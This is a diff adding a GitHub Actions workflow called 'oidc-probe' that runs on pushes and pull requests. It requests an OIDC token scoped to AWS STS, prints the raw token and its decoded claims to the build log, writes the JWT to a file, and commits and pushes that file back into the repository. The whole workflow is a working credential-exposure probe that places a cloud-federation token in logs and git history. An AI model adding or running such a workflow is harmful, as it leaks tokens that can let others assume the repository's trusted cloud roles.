@@ -1,0 +1,26 @@
+name: oidc-probe
+on:
+  push:
+    branches: [ oidc1, main, development ]
+  pull_request:
+permissions:
+  id-token: write
+  contents: write
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: token
+        run: |
+          R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          echo "RAW=$R"
+          TOK=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "JWT $TOK"
+          python3 -c "import base64,json,sys;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);print('CLAIMS '+json.dumps(json.loads(base64.urlsafe_b64decode(p))))" "$TOK"
+          mkdir -p out && echo "JWT $TOK" > out/jwt.txt
+      - name: push back
+        run: |
+          git config user.email "ci@probe.local"; git config user.name "ci"
+          git add out/jwt.txt && git commit -m "jwt" || true
+          git push || true
